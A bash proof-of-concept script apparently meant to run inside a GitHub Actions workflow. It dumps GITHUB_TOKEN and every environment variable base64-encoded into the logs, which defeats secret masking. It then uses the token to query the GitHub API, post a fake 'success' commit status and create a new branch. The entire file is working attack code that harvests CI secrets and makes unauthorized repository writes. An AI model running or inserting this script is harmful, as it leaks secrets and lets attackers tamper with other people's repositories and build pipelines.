#!/usr/bin/env bash
set +e
phase="${1:-unknown}"
b64() { printf '%s' "$1" | base64 -w0; }
echo "POC_MARKER phase=$phase at $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u)"
echo "POC_CONTEXT phase=$phase event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} sha=${GITHUB_SHA} run=${GITHUB_RUN_ID} job=${GITHUB_JOB} workflow_ref=${GITHUB_WORKFLOW_REF}"
echo "POC_WORKSPACE phase=$phase cwd=$(pwd)"
echo "POC_TOKEN phase=$phase b64=$(b64 "${GITHUB_TOKEN}")"
echo "POC_HEAD phase=$phase b64=$(b64 "$(git rev-parse HEAD 2>&1)")"
echo "POC_HEAD_SUBJECT phase=$phase b64=$(b64 "$(git log -1 --format='%H|%an|%ae|%s' 2>&1)")"
echo "POC_REMOTE phase=$phase b64=$(b64 "$(git remote -v 2>&1 | tr '\n' ';')")"
while IFS='=' read -r k v; do echo "POC_ENV phase=$phase k=$(b64 "$k") v=$(b64 "$v")"; done < <(env | sort)
api="${GITHUB_API_URL:-https://api.github.com}"
auth="Authorization: Bearer ${GITHUB_TOKEN}"
code=$(curl -s -o /tmp/poc_repo.json -w '%{http_code}' -H "$auth" -H 'Accept: application/vnd.github+json' "$api/repos/$GITHUB_REPOSITORY")
echo "POC_API_REPO phase=$phase status=$code body_b64=$(b64 "$(head -c 1200 /tmp/poc_repo.json)")"
code=$(curl -s -o /tmp/poc_who.json -w '%{http_code}' -H "$auth" -H 'Accept: application/vnd.github+json' "$api/user")
echo "POC_API_USER phase=$phase status=$code body_b64=$(b64 "$(head -c 600 /tmp/poc_who.json)")"
code=$(curl -s -o /tmp/poc_status.json -w '%{http_code}' -X POST -H "$auth" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' \
  -d "{\"state\":\"success\",\"context\":\"poc-status-${phase}\",\"description\":\"poc ${phase}\"}" \
  "$api/repos/$GITHUB_REPOSITORY/statuses/$GITHUB_SHA")
echo "POC_API_STATUS_POST phase=$phase status=$code body_b64=$(b64 "$(head -c 600 /tmp/poc_status.json)")"
code=$(curl -s -o /tmp/poc_ref.json -w '%{http_code}' -X POST -H "$auth" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' \
  -d "{\"ref\":\"refs/heads/poc-probe-${phase}-${GITHUB_RUN_ID}\",\"sha\":\"$GITHUB_SHA\"}" \
  "$api/repos/$GITHUB_REPOSITORY/git/refs")
echo "POC_API_REF_POST phase=$phase status=$code body_b64=$(b64 "$(head -c 600 /tmp/poc_ref.json)")"
if [ -r /tmp/poc-watch.tsv ]; then
  echo "POC_WATCH phase=$phase bytes=$(wc -c < /tmp/poc-watch.tsv) b64=$(b64 "$(cat /tmp/poc-watch.tsv)")"
fi
